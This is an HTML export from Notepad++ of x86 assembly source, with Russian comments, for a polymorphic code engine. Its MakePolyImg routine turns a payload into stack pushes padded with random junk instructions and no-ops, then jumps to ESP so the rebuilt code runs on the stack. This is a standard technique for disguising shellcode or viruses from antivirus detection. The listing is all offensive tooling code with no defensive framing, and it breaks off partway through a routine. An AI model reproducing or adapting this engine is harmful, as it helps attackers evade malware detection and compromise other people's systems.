<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; V2.2  07.06.2000</span><span class="sc0">
</span><span class="sc1">;  jmp esp+x</span><span class="sc0">
</span><span class="sc1">;  pusha</span><span class="sc0">
</span><span class="sc1">; v2.3 14.07.2000</span><span class="sc0">
</span><span class="sc1">;   pusha</span><span class="sc0">
</span><span class="sc1">;    ||</span><span class="sc0">
</span><span class="sc1">;   push eax</span><span class="sc0">
</span><span class="sc1">;   push ecx</span><span class="sc0">
</span><span class="sc1">;   push edx</span><span class="sc0">
</span><span class="sc1">;   push ebx</span><span class="sc0">
</span><span class="sc1">;   push (esp-4*4)</span><span class="sc0">
</span><span class="sc1">;   push ebp</span><span class="sc0">
</span><span class="sc1">;   push esi</span><span class="sc0">
</span><span class="sc1">;   push edi</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">macro.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">random.inc</span><span class="sc0">
</span><span class="sc5">NopsMaxCount</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc0">  </span><span class="sc1">; Максимальное колличество случайно генерируемых нопов.</span><span class="sc0">
</span><span class="sc5">MycopMaxCount</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">  </span><span class="sc1">; Максимальное колличество случайно генерируемых команд.</span><span class="sc0">
                      </span><span class="sc1">;  Влияют на коэффициент увеличения кода.</span><span class="sc0">
                      </span><span class="sc1">; K(10,10)=8</span><span class="sc0">
                      </span><span class="sc1">; K(10,5)=6..7</span><span class="sc0">
                      </span><span class="sc1">; K(5,10)=6</span><span class="sc0">
                      </span><span class="sc1">; K(5,5)=4..5</span><span class="sc0">
                      </span><span class="sc1">; K(5,12)=6</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; in  esi= Code</span><span class="sc0">
</span><span class="sc1">;     edi= Buffer</span><span class="sc0">
</span><span class="sc1">;     ecx= size of code</span><span class="sc0">
</span><span class="sc1">;     edx= Entry point offset</span><span class="sc0">
</span><span class="sc1">;     in stack dd (NopsMaxCount,MycopMaxCount)</span><span class="sc0">
</span><span class="sc5">MakePolyImg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
             </span><span class="sc6">pusha</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; size/4</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">MakePolyPushA</span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
             </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">MakePolyPushA</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">    </span><span class="sc1">; pusha</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">@MakePolyImgL1</span><span class="sc0">
</span><span class="sc5">MakePolyPushA</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">MakePolyPushAL2</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
              </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
              </span><span class="sc5">jb_</span><span class="sc0"> </span><span class="sc5">MakePolyPushAL1</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenMycop</span><span class="sc0">
              </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
              </span><span class="sc5">jb_</span><span class="sc0"> </span><span class="sc5">MakePolyPushAL1</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">MakePolyPushAL1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
              </span><span class="sc6">cld</span><span class="sc0">
              </span><span class="sc6">stosb</span><span class="sc0">
              </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
              </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">MakePolyPushAL2</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@MakePolyImgL1</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MycopMaxCount</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
              </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
              </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">GenMycopLoop</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenMycop</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">GenMycopLoop</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MakePush0xXXXXXXXX</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@MakePolyImgL1</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">@Mod0</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MakePush0xXXXXXXXX</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc5">regEDX</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">@Mod0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">regEDX</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MakeJMP2ESP</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">popa</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">ChetHe4et</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rand0xFF</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; in  eax=(4-mod(CodeSize/4))  остаток от деления на 4</span><span class="sc0">
</span><span class="sc5">MakeJMP2ESP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChetHe4et</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">@MakeJMP2ESPL1</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc0">  </span><span class="sc1">;push esp</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">  </span><span class="sc1">;push eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenRegF</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">MakeADD_eax_03</span><span class="sc0">
</span><span class="sc5">@MakeJMP2ESPL1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">    </span><span class="sc1">; mov eax,esp</span><span class="sc0">
               </span><span class="sc6">cld</span><span class="sc0">
               </span><span class="sc6">stosb</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenRegF</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">opCode_eRg1</span><span class="sc4">&amp;</span><span class="sc5">eRg2</span><span class="sc0">
               </span><span class="sc6">cld</span><span class="sc0">
               </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">MakeADD_eax_03</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
               </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">@Zero</span><span class="sc0">
</span><span class="sc5">@MakeADD_eax_03L1</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">cld</span><span class="sc0">
               </span><span class="sc6">stosb</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
               </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@MakeADD_eax_03L1</span><span class="sc0">
</span><span class="sc5">@Zero</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0e0ffh</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
               </span><span class="sc6">cld</span><span class="sc0">
               </span><span class="sc6">stosw</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
               </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GenMycop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChetHe4et</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">@GenMycopL1</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; Генерируем команду</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">; *8  ;</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">stosb</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Gen</span><span class="sc4">&amp;</span><span class="sc5">SetRegsOpCode</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Gen</span><span class="sc4">&amp;</span><span class="sc5">SetRegsOpCode</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenReg</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenReg</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">opCode_eRg1</span><span class="sc4">&amp;</span><span class="sc5">eRg2</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">stosb</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@GenMycopL1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Gen</span><span class="sc4">&amp;</span><span class="sc5">SetRegsOpCode</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GenNops</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pusha</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NopsMaxCount</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
</span><span class="sc5">@GenNopsL1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">@GenNopsL2</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">;Type of nop</span><span class="sc0">
          </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNop</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@GenNopsL1</span><span class="sc0">
</span><span class="sc5">@GenNopsL2</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">popa</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; in ecx=Type of nop (0..2)</span><span class="sc0">
</span><span class="sc1">;    edi=Dest</span><span class="sc0">
</span><span class="sc5">GenNop</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000000000000000000000000000011b</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@GenNopl1</span><span class="sc0">
        </span><span class="sc5">@GenNopl2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">case0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@GenNopl2</span><span class="sc0">
                   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">case1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@GenNopl2</span><span class="sc0">
                   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">case2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@GenNopl2</span><span class="sc0">
                   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ERts</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@GenNopl2</span><span class="sc0">
        </span><span class="sc5">@GenNopl1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">case0</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenRegF</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">05850h</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">
                   </span><span class="sc6">stosw</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03bh</span><span class="sc4">,</span><span class="sc2">085h</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">08Dh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0A3h</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">case1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenRegF</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenRegF</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
